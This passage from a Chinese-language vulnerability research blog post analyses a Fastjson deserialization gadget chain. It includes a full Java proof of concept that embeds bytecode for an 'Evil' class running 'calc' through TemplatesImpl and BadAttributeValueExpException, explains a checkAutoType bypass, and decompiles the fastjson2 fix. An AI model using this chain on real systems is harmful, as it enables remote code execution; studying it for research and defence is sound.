javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonSerTest</span> &#123;<br>    <span class="hljs-comment">// 封装 setFieldValue 方法，用来反射设置字段值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 用字节数组定义恶意类</span><br>        <span class="hljs-type">byte</span>[] code = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;-<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">55</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">69</span>, <span class="hljs-number">118</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">69</span>, <span class="hljs-number">118</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">64</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">47</span>, <span class="hljs-number">115</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">47</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">97</span>, <span class="hljs-number">112</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">47</span>, <span class="hljs-number">120</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">47</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">110</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">47</span>, <span class="hljs-number">120</span>, <span class="hljs-number">115</span>, <span class="hljs-number">108</span>, <span class="hljs-number">116</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">114</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">47</span>, <span class="hljs-number">65</span>, <span class="hljs-number">98</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">84</span>, <span class="hljs-number">114</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">60</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">59</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">99</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>, <span class="hljs-number">99</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">59</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">21</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">22</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">72</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">74</span>, <span class="hljs-number">0</span>, <span class="hljs-number">23</span>, <span class="hljs-number">87</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">26</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>&#125;;<br>        <span class="hljs-comment">//装载Template</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(template, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(template, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Evil&quot;</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(template);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, jsonArray);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        <span class="hljs-comment">// 先放入 template，再放入 badAttributeValueExpException</span><br>        oos.writeObject(template);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-keyword">try</span>&#123;<br>            ois.readObject(); <span class="hljs-comment">// 读取 template</span><br>            ois.readObject(); <span class="hljs-comment">// 读取 badAttributeValueExpException</span><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入了 readObject0 的 TC_REFERENCE 分支</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404133754820.png" alt="image-20250404133754820"></p><p>成功返回 TemplateImpl 对象</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404133948549.png" alt="image-20250404133948549"></p><p>毫无疑问，执行成功</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250403212508255.png" alt="image-20250403212508255"></p><blockquote><p><strong>注意：</strong></p><p>这个改造只是方便我们理解的小实验，真是环境中 readObject 肯定就只执行一次，一般没有两次连着执行的。用 HashMap 封装就很好的解决了这个问题。更加适用于真实场景</p></blockquote><p>HashMap 在反序列化的过程中，正好会先去反序列化 key（TemplateImpl ）再去反序列化 value（badAttributeValueExpException）正好可以 满足在第二次反序列化 <code>TemplateImpl </code> 的时候，走到 <code>TC_REFERENCE</code> 分支，从而绕过 checkAutoType 的检查</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>FastJSON 2.0.27 开始支持 JSONB（JSON Binary）格式，JSONB 是一种二进制 JSON 格式，旨在提供比传统文本 JSON 更高的性能和更小的存储空间。它允许将 Java 对象序列化为二进制格式，并能高效地解析回 Java 对象。</p><p>在 fastjson 2.0.27中 看到 asm 生成的 writer 对象不再是 <code>ASMSerializer_1_TemplatesImpl</code> 而是变为了 <code>OWG_1_0_TemplatesImpl</code> 对象</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250404144129145.png" alt="image-20250404144129145"></p><p>dump下来看看</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jad com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson2</span><span class="hljs-selector-class">.writer</span><span class="hljs-selector-class">.OWG_1_0_TemplatesImpl</span> <br></code></pre></td></tr></table></figure><p>这个类 也不是很长，就全部 dump下来了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Decompiled with CFR.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> com.alibaba.fastjson2.writer;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONWriter;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.writer.ObjectWriter;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.writer.ObjectWriterAdapter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OWG_1_0_TemplatesImpl</span><br><span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectWriterAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectWriter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OWG_1_0_TemplatesImpl</span><span class="hljs-params">(Class clazz, String string, String string2, <span class="hljs-type">long</span> l, List list)</span> &#123;<br>        <span class="hljs-built_in">super</span>(clazz, string, string2, l, list);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeJSONB</span><span class="hljs-params">(JSONWriter jSONWriter, Object object, Object object2, Type type, <span class="hljs-type">long</span> l)</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> jSONWriter.getFeatures();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x1000L</span>) - <span class="hljs-number">0L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> l3 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l3 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (l4 != <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l5</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x50L</span>) - <span class="hljs-number">0L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l6</span> <span class="hljs-operator">=</span> l5 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l5 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (object != <span class="hljs-literal">null</span> &amp;&amp; object.getClass() != type &amp;&amp; jSONWriter.isWriteTypeInfo(object, type)) &#123;<br>            <span class="hljs-built_in">this</span>.writeClassInfo(jSONWriter);<br>        &#125;<br>        jSONWriter.startObject();<br>        jSONWriter.endObject();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(JSONWriter jSONWriter, Object object, Object object2, Type type, <span class="hljs-type">long</span> l)</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> jSONWriter.getFeatures();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x1000L</span>) - <span class="hljs-number">0L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> l3 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l3 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (l4 != <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l5</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x50L</span>) - <span class="hljs-number">0L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l6</span> <span class="hljs-operator">=</span> l5 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l5 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((l2 &amp; <span class="hljs-number">0x8000L</span>) != <span class="hljs-number">0L</span>) &#123;<br>            <span class="hljs-built_in">super</span>.write(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (jSONWriter.jsonb) &#123;<br>            <span class="hljs-keyword">if</span> ((l2 &amp; <span class="hljs-number">8L</span>) != <span class="hljs-number">0L</span>) &#123;<br>                <span class="hljs-built_in">this</span>.writeArrayMappingJSONB(jSONWriter, object, object2, type, l);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-built_in">this</span>.writeJSONB(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((l2 &amp; <span class="hljs-number">8L</span>) != <span class="hljs-number">0L</span>) &#123;<br>            <span class="hljs-built_in">this</span>.writeArrayMapping(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hasFilter(jSONWriter)) &#123;<br>            <span class="hljs-built_in">this</span>.writeWithFilter(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        jSONWriter.startObject();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (object != <span class="hljs-literal">null</span> &amp;&amp; object.getClass() != type &amp;&amp; jSONWriter.isWriteTypeInfo(object, type)) &#123;<br>            bl = <span class="hljs-built_in">this</span>.writeTypeInfo(jSONWriter) ^ <span class="hljs-literal">true</span>;<br>        &#125;<br>        jSONWriter.endObject();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeArrayMappingJSONB</span><span class="hljs-params">(JSONWriter jSONWriter, Object object, Object object2, Type type, <span class="hljs-type">long</span> l)</span> &#123;<br>        <span class="hljs-keyword">if</span> (object != <span class="hljs-literal">null</span> &amp;&amp; object.getClass() != type &amp;&amp; jSONWriter.isWriteTypeInfo(object, type)) &#123;<br>            <span class="hljs-built_in">this</span>.writeClassInfo(jSONWriter);<br>        &#125;<br>        jSONWriter.startArray(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> jSONWriter.getFeatures();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x1000L</span>) - <span class="hljs-number">0L</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> l3 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l3 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (l4 != <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">bl</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l5</span> <span class="hljs-operator">=</span> (l2 &amp; <span class="hljs-number">0x50L</span>) - <span class="hljs-number">0L</span>;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">l6</span> <span class="hljs-operator">=</span> l5 == <span class="hljs-number">0L</span> ? <span class="hljs-number">0</span> : (l5 &lt; <span class="hljs-number">0L</span> ? -<span class="hljs-number">1</span> : <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeArrayMapping</span><span class="hljs-params">(JSONWriter jSONWriter, Object object, Object object2, Type type, <span class="hljs-type">long</span> l)</span> &#123;<br>        <span class="hljs-keyword">if</span> (jSONWriter.jsonb) &#123;<br>            <span class="hljs-built_in">this</span>.writeArrayMappingJSONB(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.hasFilter(jSONWriter)) &#123;<br>            <span class="hljs-built_in">super</span>.writeArrayMapping(jSONWriter, object, object2, type, l);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        jSONWriter.startArray();<br>        jSONWriter.endArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 OWG_1_0_TemplatesImpl 的 write 方法中，通过检查 jSONWriter.jsonb 标志，如果启用了 JSONB 格式，会调用 writeJSONB 或 writeArrayMappingJSONB 